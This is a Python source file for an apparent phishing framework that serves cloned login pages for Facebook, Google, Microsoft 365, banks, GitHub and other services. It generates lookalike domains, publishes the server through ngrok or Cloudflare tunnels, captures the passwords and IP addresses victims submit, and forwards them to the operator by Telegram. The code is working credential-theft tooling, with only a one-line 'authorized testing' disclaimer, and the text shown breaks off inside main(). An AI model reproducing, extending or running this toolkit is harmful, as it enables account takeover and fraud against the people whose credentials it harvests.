#!/usr/bin/env python3
"""
MIMIC-PHISH ULTIMATE v3.0 - Advanced Phishing Attack Framework
Professional Phishing Toolkit - C2 IP & Domain Integration

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: sudo python3 mimic_phish_ultimate.py
"""

import sys
import os
import re
import json
import time
import random
import socket
import threading
import subprocess
import signal
import ssl
import base64
import hashlib
import requests
import zipfile
import tempfile
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin, parse_qs
import http.server
import socketserver

try:
    from flask import Flask, request, render_template_string, redirect, send_file, jsonify
    from flask_cors import CORS
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.GOLD}{Colors.BOLD}    ███╗   ███╗██╗███╗   ███╗██╗ ██████╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
    ████╗ ████║██║████╗ ████║██║██╔════╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║
    ██╔████╔██║██║██╔████╔██║██║██║         ██████╔╝███████║██║███████╗███████║
    ██║╚██╔╝██║██║██║╚██╔╝██║██║██║         ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
    ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║╚██████╗    ██║     ██║  ██║██║███████║██║  ██║
    ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝ ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - PHISHING MASTER{Colors.WHITE}
{Colors.CYAN}    Professional Phishing Toolkit - C2 IP & Domain Integrated{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== C2 IP DETECTOR ====================
class C2IPDetector:
    """Auto-detect C2 server IP addresses"""
    
    @staticmethod
    def get_public_ip() -> str:
        """Get public IP address"""
        try:
            # Try multiple services
            services = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://ifconfig.me/ip',
                'https://icanhazip.com',
                'https://checkip.amazonaws.com'
            ]
            
            for service in services:
                try:
                    response = requests.get(service, timeout=5)
                    if response.status_code == 200:
                        if 'ipify' in service or 'httpbin' in service:
                            return response.json().get('ip', '').strip()
                        else:
                            return response.text.strip()
                except:
                    continue
            return None
        except:
            return None
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_all_ips() -> Dict:
        """Get all IP addresses"""
        return {
            'public': C2IPDetector.get_public_ip(),
            'local': C2IPDetector.get_local_ip(),
            'hostname': socket.gethostname()
        }

# ==================== DOMAIN GENERATOR ====================
class DomainGenerator:
    """Generate phishing domains and tunnels"""
    
    DOMAIN_PATTERNS = {
        'facebook': ['facebook-secure', 'fb-login', 'facebook-verify', 'fb-security', 'facebook-check'],
        'google': ['google-verify', 'google-secure', 'gmail-login', 'google-auth', 'google-check'],
        'office365': ['office-verify', 'ms365-login', 'office-secure', 'microsoft-auth', 'office-check'],
        'bank': ['banking-secure', 'online-banking', 'secure-bank', 'bank-login', 'bank-verify'],
        'cloudflare': ['cloudflare-check', 'cf-security', 'cloudflare-verify', 'flare-secure'],
        'instagram': ['instagram-verify', 'ig-login', 'insta-secure', 'instagram-auth'],
        'twitter': ['twitter-verify', 'x-login', 'twitter-secure', 'x-auth'],
        'linkedin': ['linkedin-verify', 'linkedin-secure', 'in-login', 'linkedin-auth'],
        'github': ['github-verify', 'github-secure', 'gh-login', 'github-auth']
    }
    
    TLDs = ['.tk', '.ml', '.ga', '.cf', '.gq', '.com', '.org', '.net', '.io', '.xyz']
    
    @staticmethod
    def generate_domain(template: str) -> str:
        """Generate a phishing domain"""
        patterns = DomainGenerator.DOMAIN_PATTERNS.get(template, ['secure-login'])
        pattern = random.choice(patterns)
        tld = random.choice(DomainGenerator.TLDs)
        
        # Add random number sometimes
        if random.random() > 0.5:
            pattern += str(random.randint(1, 99))
        
        return f"{pattern}{tld}"
    
    @staticmethod
    def generate_links(domain: str, template: str, ip: str = None) -> Dict:
        """Generate various phishing links"""
        links = {}
        
        # HTTP/HTTPS
        links['http'] = f"http://{domain}"
        links['https'] = f"https://{domain}"
        
        # With IP (if provided)
        if ip:
            links['http_ip'] = f"http://{ip}"
            links['https_ip'] = f"https://{ip}"
        
        # With common paths
        paths = ['/login', '/auth', '/verify', '/signin', '/secure', '/portal']
        for path in paths:
            links[f'https_{path}'] = f"https://{domain}{path}"
        
        # With parameters
        params = ['?ref=email', '?utm_source=email', '?redirect=home', '?auth=required']
        for param in params:
            links[f'https_param'] = f"https://{domain}{random.choice(paths)}{param}"
        
        return links

# ==================== TUNNEL MANAGER ====================
class TunnelManager:
    """Manage tunnels (Ngrok, Cloudflare)"""
    
    @staticmethod
    def check_ngrok() -> bool:
        """Check if ngrok is installed"""
        try:
            subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
            return True
        except:
            return False
    
    @staticmethod
    def start_ngrok(port: int) -> Optional[str]:
        """Start ngrok tunnel"""
        if not TunnelManager.check_ngrok():
            cprint("[!] Ngrok not installed. Install: snap install ngrok", Colors.YELLOW)
            return None
        
        try:
            # Start ngrok in background
            subprocess.Popen(
                ['ngrok', 'http', str(port), '--log=stdout'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(3)
            
            # Get public URL
            response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('tunnels'):
                    return data['tunnels'][0]['public_url']
        except:
            pass
        return None
    
    @staticmethod
    def check_cloudflared() -> bool:
        """Check if cloudflared is installed"""
        try:
            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
            return True
        except:
            return False
    
    @staticmethod
    def start_cloudflare(port: int) -> Optional[str]:
        """Start Cloudflare tunnel"""
        if not TunnelManager.check_cloudflared():
            cprint("[!] Cloudflared not installed. Install: apt install cloudflared", Colors.YELLOW)
            return None
        
        try:
            # Start cloudflared
            process = subprocess.Popen(
                ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Get URL from output
            for line in process.stdout:
                if '.trycloudflare.com' in line:
                    url = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                    if url:
                        return url.group(0)
        except:
            pass
        return None

# ==================== PHISHING TEMPLATES ====================
class PhishingTemplates:
    TEMPLATES = {
        'facebook': {'name': 'Facebook Login', 'icon': 'F', 'color': '#1877f2'},
        'google': {'name': 'Google Login', 'icon': 'G', 'color': '#1a73e8'},
        'office365': {'name': 'Microsoft 365', 'icon': 'M', 'color': '#0078d4'},
        'bank': {'name': 'Banking Login', 'icon': 'B', 'color': '#003366'},
        'cloudflare': {'name': 'Cloudflare Verify', 'icon': 'C', 'color': '#f38020'},
        'instagram': {'name': 'Instagram Login', 'icon': 'I', 'color': '#e4405f'},
        'twitter': {'name': 'Twitter Login', 'icon': 'T', 'color': '#1da1f2'},
        'linkedin': {'name': 'LinkedIn Login', 'icon': 'L', 'color': '#0077b5'},
        'github': {'name': 'GitHub Login', 'icon': 'G', 'color': '#24292e'}
    }
    
    @staticmethod
    def get_template(name: str) -> str:
        templates = {
            'facebook': PhishingTemplates._facebook,
            'google': PhishingTemplates._google,
            'office365': PhishingTemplates._office365,
            'bank': PhishingTemplates._bank,
            'cloudflare': PhishingTemplates._cloudflare,
            'instagram': PhishingTemplates._instagram,
            'twitter': PhishingTemplates._twitter,
            'linkedin': PhishingTemplates._linkedin,
            'github': PhishingTemplates._github
        }
        return templates.get(name, PhishingTemplates._facebook)()
    
    @staticmethod
    def _facebook():
        return '''<!DOCTYPE html>
        <html><head><title>Facebook Login</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}.container{max-width:400px;margin:100px auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1)}.logo{text-align:center;font-size:48px;color:#1877f2;font-weight:bold;margin-bottom:20px}input{width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px}button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer}
        </style></head>
        <body><div class="container"><div class="logo">f</div>
        <h2 style="text-align:center;color:#1c1e21;margin-bottom:20px;">Log in to Facebook</h2>
        <form method="POST" action="/capture">
        <input type="text" name="email" placeholder="Email or phone" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button></form></div></body></html>'''
    
    @staticmethod
    def _google():
        return '''<!DOCTYPE html>
        <html><head><title>Google Sign In</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Roboto,Arial,sans-serif;background:#fff}.container{max-width:450px;margin:80px auto;padding:40px}input{width:100%;padding:15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
        </style></head>
        <body><div class="container">
        <h2 style="text-align:center;color:#202124;">Sign in</h2>
        <p style="text-align:center;color:#5f6368;margin-bottom:20px;">Use your Google Account</p>
        <form method="POST" action="/capture">
        <input type="email" name="email" placeholder="Email or phone" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Next</button></form></div></body></html>'''
    
    @staticmethod
    def _office365():
        return '''<!DOCTYPE html>
        <html><head><title>Microsoft Sign In</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Segoe UI,Arial,sans-serif;background:#f2f2f2}.container{max-width:440px;margin:80px auto;background:#fff;padding:44px;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.1)}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:2px;font-size:15px}button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px;cursor:pointer;font-size:15px}
        </style></head>
        <body><div class="container">
        <h2 style="text-align:center;color:#202124;">Sign in</h2>
        <form method="POST" action="/capture">
        <input type="text" name="email" placeholder="Email, phone, or Skype" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button></form></div></body></html>'''
    
    @staticmethod
    def _bank():
        return '''<!DOCTYPE html>
        <html><head><title>Secure Banking</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#f5f5f5}.container{max-width:400px;margin:100px auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#003366;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}
        </style></head>
        <body><div class="container">
        <h3 style="text-align:center;color:#333;margin-bottom:20px;">Secure Login</h3>
        <form method="POST" action="/capture">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button></form></div></body></html>'''
    
    @staticmethod
    def _cloudflare():
        return '''<!DOCTYPE html>
        <html><head><title>Cloudflare Security</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#f8fafc}.container{max-width:500px;margin:100px auto;background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1)}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#f38020;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}
        </style></head>
        <body><div class="container">
        <h3 style="text-align:center;">Security Verification</h3>
        <form method="POST" action="/capture">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify</button></form></div></body></html>'''
    
    @staticmethod
    def _instagram():
        return '''<!DOCTYPE html>
        <html><head><title>Instagram Login</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#fafafa}.container{max-width:350px;margin:80px auto;background:#fff;padding:40px;border:1px solid #dbdbdb;border-radius:1px}input{width:100%;padding:10px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px}button{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
        </style></head>
        <body><div class="container">
        <h2 style="text-align:center;font-family:Georgia;font-size:36px;margin-bottom:30px;">Instagram</h2>
        <form method="POST" action="/capture">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button></form></div></body></html>'''
    
    @staticmethod
    def _twitter():
        return '''<!DOCTYPE html>
        <html><head><title>Twitter Login</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#fff}.container{max-width:400px;margin:80px auto;padding:20px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:50px;font-size:16px;font-weight:bold;cursor:pointer}
        </style></head>
        <body><div class="container">
        <h2 style="text-align:center;font-size:32px;margin-bottom:20px;"></h2>
        <form method="POST" action="/capture">
        <input type="text" name="username" placeholder="Phone, email, or username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button></form></div></body></html>'''
    
    @staticmethod
    def _linkedin():
        return '''<!DOCTYPE html>
        <html><head><title>LinkedIn Login</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#f3f2f0}.container{max-width:400px;margin:100px auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1)}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}button{width:100%;padding:12px;background:#0077b5;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}
        </style></head>
        <body><div class="container">
        <h2 style="text-align:center;color:#0077b5;font-size:28px;">in</h2>
        <form method="POST" action="/capture">
        <input type="text" name="username" placeholder="Email or phone" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button></form></div></body></html>'''
    
    @staticmethod
    def _github():
        return '''<!DOCTYPE html>
        <html><head><title>GitHub Login</title>
        <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Helvetica,Arial,sans-serif;background:#fff}.container{max-width:400px;margin:80px auto;padding:20px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #d0d7de;border-radius:6px;font-size:16px}button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer}
        </style></head>
        <body><div class="container">
        <h2 style="text-align:center;font-size:32px;margin-bottom:20px;">GitHub</h2>
        <form method="POST" action="/capture">
        <input type="text" name="username" placeholder="Username or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Sign in</button></form></div></body></html>'''

# ==================== TELEGRAM NOTIFIER ====================
class TelegramNotifier:
    def __init__(self, bot_token: str, chat_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    def send(self, message: str):
        try:
            data = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }
            requests.post(self.api_url, data=data, timeout=5)
        except:
            pass

# ==================== PHISHING ENGINE ====================
class PhishingEngine:
    def __init__(self, port: int = 80, use_ssl: bool = False, domain: str = None,
                 telegram_token: str = None, telegram_chat: str = None):
        self.port = port
        self.use_ssl = use_ssl
        self.domain = domain or "localhost"
        self.captured_data = []
        self.running = False
        self.app = None
        self.stats = {
            'total_visits': 0,
            'total_captures': 0,
            'unique_ips': set(),
            'start_time': datetime.now()
        }
        self.notifier = None
        
        if telegram_token and telegram_chat:
            self.notifier = TelegramNotifier(telegram_token, telegram_chat)
    
    def start(self, template: str = 'facebook'):
        cprint(f"\n[PHISH] Starting phishing server on port {self.port}", Colors.GOLD)
        cprint(f"[PHISH] Template: {template}", Colors.DIM)
        
        if not FLASK_AVAILABLE:
            cprint("[!] Flask not available. Using built-in server.", Colors.YELLOW)
            self._start_builtin_server(template)
            return
        
        self._start_flask_server(template)
    
    def _start_flask_server(self, template: str):
        app = Flask(__name__)
        CORS(app)
        
        html_content = PhishingTemplates.get_template(template)
        
        @app.route('/')
        def index():
            self.stats['total_visits'] += 1
            self.stats['unique_ips'].add(request.remote_addr)
            return html_content
        
        @app.route('/capture', methods=['POST'])
        def capture():
            data = request.form.to_dict()
            data['ip'] = request.remote_addr
            data['user_agent'] = request.headers.get('User-Agent')
            data['timestamp'] = datetime.now().isoformat()
            
            self.captured_data.append(data)
            self.stats['total_captures'] += 1
            
            self._display_captured(data)
            
            if self.notifier:
                msg = f"""
NEW CREDENTIALS CAPTURED
Email: {data.get('email', data.get('username', 'N/A'))}
Password: {data.get('password', 'N/A')}
IP: {data.get('ip', 'N/A')}
Time: {data.get('timestamp', 'N/A')}
                """
                self.notifier.send(msg)
            
            return redirect('https://www.google.com')
        
        @app.route('/api/stats')
        def stats():
            return jsonify({
                'total_visits': self.stats['total_visits'],
                'total_captures': self.stats['total_captures'],
                'unique_ips': len(self.stats['unique_ips']),
                'uptime': str(datetime.now() - self.stats['start_time'])
            })
        
        @app.route('/api/data')
        def view_data():
            return jsonify(self.captured_data)
        
        @app.route('/api/clear', methods=['POST'])
        def clear_data():
            self.captured_data = []
            return jsonify({'status': 'cleared'})
        
        self.app = app
        self.running = True
        
        if self.use_ssl:
            cert_file = 'server.crt'
            key_file = 'server.key'
            if not os.path.exists(cert_file):
                self._generate_ssl_cert(cert_file, key_file)
            
            app.run(host='0.0.0.0', port=self.port, ssl_context=(cert_file, key_file))
        else:
            app.run(host='0.0.0.0', port=self.port)
    
    def _start_builtin_server(self, template: str):
        html_content = PhishingTemplates.get_template(template)
        
        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(html_content.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                
                data = {}
                for pair in post_data.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[key] = value
                
                data['ip'] = self.client_address[0]
                data['user_agent'] = self.headers.get('User-Agent')
                data['timestamp'] = datetime.now().isoformat()
                
                self.server.captured_data.append(data)
                self.server._display_captured(data)
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        handler = PhishingHandler
        handler.captured_data = self.captured_data
        handler._display_captured = self._display_captured
        
        self.server = socketserver.TCPServer(('0.0.0.0', self.port), handler)
        self.running = True
        
        cprint(f"[+] Phishing server running on http://localhost:{self.port}", Colors.GREEN)
        
        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            self.stop()
    
    def _generate_ssl_cert(self, cert_file: str, key_file: str):
        try:
            subprocess.run([
                'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                '-keyout', key_file, '-out', cert_file,
                '-days', '365', '-nodes',
                '-subj', '/CN=localhost'
            ], check=True, capture_output=True)
            cprint("[+] SSL certificate generated", Colors.GREEN)
        except:
            cprint("[-] SSL certificate generation failed", Colors.RED)
    
    def _display_captured(self, data: Dict):
        cprint("\n" + "="*70, Colors.RED)
        cprint(" CREDENTIALS CAPTURED", Colors.RED, bold=True)
        cprint("="*70, Colors.RED)
        
        for key, value in data.items():
            if key not in ['timestamp', 'ip', 'user_agent']:
                cprint(f"[!] {key}: {value}", Colors.YELLOW)
        
        cprint(f"[*] IP: {data.get('ip', 'unknown')}", Colors.DIM)
        cprint(f"[*] Time: {data.get('timestamp', 'unknown')}", Colors.DIM)
        cprint("="*70 + "\n")
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.shutdown()
        cprint("[+] Phishing server stopped", Colors.GREEN)

# ==================== MAIN FRAMEWORK ====================
class MimicPhishUltimate:
    def __init__(self):
        self.engine = None
        self.c2_ips = C2IPDetector.get_all_ips()
        self.domain = None
        self.tunnel_url = None
    
    def show_info(self):
        """Show C2 IP and domain information"""
        cprint("\n" + "="*70, Colors.CYAN)
        cprint(" C2 SERVER INFORMATION", Colors.PURPLE, bold=True)
        cprint("="*70, Colors.CYAN)
        
        cprint(f"[+] Public IP: {self.c2_ips.get('public', 'Unknown')}", Colors.GREEN)
        cprint(f"[+] Local IP: {self.c2_ips.get('local', 'Unknown')}", Colors.GREEN)
        cprint(f"[+] Hostname: {self.c2_ips.get('hostname', 'Unknown')}", Colors.GREEN)
        
        if self.domain:
            cprint(f"[+] Domain: {self.domain}", Colors.GOLD)
        
        if self.tunnel_url:
            cprint(f"[+] Tunnel URL: {self.tunnel_url}", Colors.GOLD)
        
        print("="*70)
    
    def generate_phishing_links(self, template: str) -> Dict:
        """Generate phishing links based on template"""
        links = {}
        
        # Generate domain
        self.domain = DomainGenerator.generate_domain(template)
        
        # Generate links with domain
        links['domain_http'] = f"http://{self.domain}"
        links['domain_https'] = f"https://{self.domain}"
        
        # Generate links with IP
        public_ip = self.c2_ips.get('public')
        if public_ip:
            links['ip_http'] = f"http://{public_ip}"
            links['ip_https'] = f"https://{public_ip}"
        
        # Generate links with local IP (for internal testing)
        local_ip = self.c2_ips.get('local')
        if local_ip:
            links['local_http'] = f"http://{local_ip}"
            links['local_https'] = f"https://{local_ip}"
        
        # Generate common phishing paths
        paths = ['/login', '/auth', '/verify', '/signin', '/secure', '/portal', '/2fa']
        for path in paths:
            links[f'domain_path'] = f"https://{self.domain}{path}"
        
        # Generate with parameters
        params = ['?ref=email', '?utm_source=email', '?redirect=home']
        for param in params:
            links[f'domain_param'] = f"https://{self.domain}{random.choice(paths)}{param}"
        
        # Tunnel URL (if available)
        if self.tunnel_url:
            links['tunnel'] = self.tunnel_url
        
        return links
    
    def show_links(self, links: Dict):
        """Display generated links"""
        cprint("\n" + "="*70, Colors.CYAN)
        cprint(" PHISHING LINKS", Colors.PURPLE, bold=True)
        cprint("="*70, Colors.CYAN)
        
        for name, url in links.items():
            cprint(f"[+] {name}: {url}", Colors.GREEN)
        
        cprint("\n" + "="*70, Colors.DIM)
        cprint("[*] Send these links to your targets", Colors.YELLOW)
        cprint("[*] Recommended: Use the domain_https or tunnel link", Colors.YELLOW)
    
    def setup_tunnel(self, port: int):
        """Setup tunnel for phishing server"""
        cprint("\n" + "="*70, Colors.CYAN)
        cprint(" TUNNEL SETUP", Colors.PURPLE, bold=True)
        cprint("="*70, Colors.CYAN)
        
        cprint("[1] Ngrok (Free, easy)", Colors.GREEN)
        cprint("[2] Cloudflare Tunnel (Free, reliable)", Colors.GREEN)
        cprint("[3] Skip (use IP/domain directly)", Colors.GREEN)
        
        choice = input(f"\n{Colors.CYAN}[>] Select (1-3): {Colors.WHITE}").strip()
        
        if choice == '1':
            url = TunnelManager.start_ngrok(port)
            if url:
                self.tunnel_url = url
                cprint(f"[+] Ngrok tunnel: {url}", Colors.GOLD)
            else:
                cprint("[-] Ngrok tunnel failed", Colors.RED)
        elif choice == '2':
            url = TunnelManager.start_cloudflare(port)
            if url:
                self.tunnel_url = url
                cprint(f"[+] Cloudflare tunnel: {url}", Colors.GOLD)
            else:
                cprint("[-] Cloudflare tunnel failed", Colors.RED)
        else:
            cprint("[*] Skipping tunnel setup", Colors.YELLOW)
    
    def show_menu(self):
        print(f"\n{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print(f"{Colors.BOLD}MIMIC-PHISH ULTIMATE v{VERSION} - Phishing Menu{Colors.WHITE}")
        print(f"{Colors.BLUE}{'='*60}{Colors.WHITE}")
        print("1. Show C2 Server Info")
        print("2. Generate Phishing Links")
        print("3. Start Phishing Server")
        print("4. Setup Tunnel")
        print("5. View Captured Data")
        print("6. Clear Captured Data")
        print("7. Export Results")
        print("8. View Statistics")
        print("9. Configure Telegram")
        print("10. Stop Server")
        print("11. Exit")
    
    def select_template(self) -> str:
        templates = {
            '1': 'facebook', '2': 'google', '3': 'office365',
            '4': 'bank', '5': 'cloudflare', '6': 'instagram',
            '7': 'twitter', '8': 'linkedin', '9': 'github'
        }
        
        print("\n" + "="*60)
        cprint(" SELECT PHISHING TEMPLATE", Colors.PURPLE, bold=True)
        print("="*60)
        print("1. Facebook Login")
        print("2. Google Login")
        print("3. Microsoft 365")
        print("4. Banking Login")
        print("5. Cloudflare Verify")
        print("6. Instagram Login")
        print("7. Twitter Login")
        print("8. LinkedIn Login")
        print("9. GitHub Login")
        
        choice = input(f"\n{Colors.CYAN}[>] Select (1-9): {Colors.WHITE}").strip()
        return templates.get(choice, 'facebook')
    
    def get_phishing_options(self) -> Tuple[int, bool]:
        port = input("[>] Port (default 80): ").strip()
        port = int(port) if port else 80
        
        use_ssl = input("[>] Enable SSL? (y/N): ").strip().lower() == 'y'
        
        return port, use_ssl
    
    def configure_telegram(self) -> Tuple[str, str]:
        token = input("[>] Telegram Bot Token: ").strip()
        chat_id = input("[>] Telegram Chat ID: ").strip()
        return token, chat_id
    
    def start_campaign(self):
        template = self.select_template()
        port, use_ssl = self.get_phishing_options()
        
        cprint(f"\n[+] Starting phishing campaign with template: {template}", Colors.GREEN)
        cprint(f"[*] Server: http{'s' if use_ssl else ''}://0.0.0.0:{port}", Colors.DIM)
        
        # Generate and show links
        links = self.generate_phishing_links(template)
        self.show_links(links)
        
        # Setup tunnel
        self.setup_tunnel(port)
        
        # Update links with tunnel
        if self.tunnel_url:
            cprint(f"\n[+] Tunnel URL: {self.tunnel_url}", Colors.GOLD)
        
        self.engine = PhishingEngine(port, use_ssl)
        
        try:
            self.engine.start(template)
        except KeyboardInterrupt:
            self.engine.stop()
    
    def view_data(self):
        if not self.engine or not self.engine.captured_data:
            cprint("[!] No captured data", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" CAPTURED CREDENTIALS", Colors.RED, bold=True)
        print("="*70)
        
        for i, data in enumerate(self.engine.captured_data, 1):
            print(f"\n[{i}] {data.get('timestamp', 'unknown')}")
            for key, value in data.items():
                if key not in ['timestamp', 'ip', 'user_agent']:
                    print(f"    {key}: {value}")
            print(f"    IP: {data.get('ip', 'unknown')}")
    
    def export_results(self):
        if not self.engine or not self.engine.captured_data:
            cprint("[!] No data to export", Colors.YELLOW)
            return
        
        filename = f"phish_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(self.engine.captured_data, f, indent=2)
        
        cprint(f"[+] Results exported to {filename}", Colors.GREEN)
    
    def view_stats(self):
        if not self.engine:
            cprint("[!] No active server", Colors.YELLOW)
            return
        
        stats = self.engine.stats
        print("\n" + "="*60)
        cprint(" PHISHING STATISTICS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Total Visits: {stats['total_visits']}")
        print(f"Total Captures: {stats['total_captures']}")
        print(f"Unique IPs: {len(stats['unique_ips'])}")
        print(f"Uptime: {datetime.now() - stats['start_time']}")
        print(f"Capture Rate: {stats['total_captures']/stats['total_visits']*100:.1f}%" if stats['total_visits'] > 0 else "Capture Rate: 0%")
        print("="*60)
    
    def clear_data(self):
        if self.engine:
            self.engine.captured_data = []
            cprint("[+] Data cleared", Colors.GREEN)
    
    def stop_server(self):
        if self.engine:
            self.engine.stop()
            self.engine = None
            cprint("[+] Server stopped", Colors.GREEN)
    
    def run(self):
        telegram_token = None
        telegram_chat = None
        
        # Show C2 info first
        self.show_info()
        
        while True:
            self.show_menu()
            choice = input(f"\n{Colors.CYAN}[>] Select (1-11): {Colors.WHITE}").strip()
            
            if choice == '1':
                self.show_info()
            elif choice == '2':
                template = self.select_template()
                links = self.generate_phishing_links(template)
                self.show_links(links)
            elif choice == '3':
                self.start_campaign()
            elif choice == '4':
                self.setup_tunnel(80)
            elif choice == '5':
                self.view_data()
            elif choice == '6':
                self.clear_data()
            elif choice == '7':
                self.export_results()
            elif choice == '8':
                self.view_stats()
            elif choice == '9':
                token, chat = self.configure_telegram()
                if token and chat:
                    telegram_token = token
                    telegram_chat = chat
                    cprint("[+] Telegram notifications configured", Colors.GREEN)
                else:
                    cprint("[-] Telegram configuration cancelled", Colors.YELLOW)
            elif choice == '10':
                self.stop_server()
            elif choice == '11':
                if self.engine:
                    self.engine.stop()
                cprint("\n[*] Exiting MIMIC-PHISH ULTIMATE...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="MIMIC-PHISH ULTIMATE - Advanced Phishing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 mimic_phish_ultimate.py
